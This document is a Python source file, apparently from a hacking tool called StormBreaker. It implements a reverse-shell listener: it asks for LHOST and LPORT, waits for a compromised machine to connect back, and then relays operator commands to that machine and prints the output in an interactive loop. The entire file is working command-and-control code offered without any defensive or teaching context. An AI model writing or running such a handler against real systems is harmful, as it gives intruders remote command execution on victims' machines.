import socket

class Listener:
    def __init__(self):
        lhost = input("\n      [*] Enter LHOST: ")
        lport = int(input("      [*] Enter LPORT: "))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind((lhost, lport))
        except:
            print("\n      [-] Invalid IP Adress!\n")
        else:
            print("      [*] Listening for Conections...")
            s.listen()
            conn, addr = s.accept()
            print(f"\n      [+] Connected to {addr[0]}\n")

            while True:
                command = input(f"      <<StormBreaker@{addr[0]}>> ")
                if command != "":
                    if command != "quit":
                        conn.send(command.encode())
                        recieved_data = conn.recv(5000).decode()
                        print(f"      {recieved_data}")
                    else:
                        conn.close()
                        print("\n[-] Connection Closed!\n")
                        break
                else:
                    pass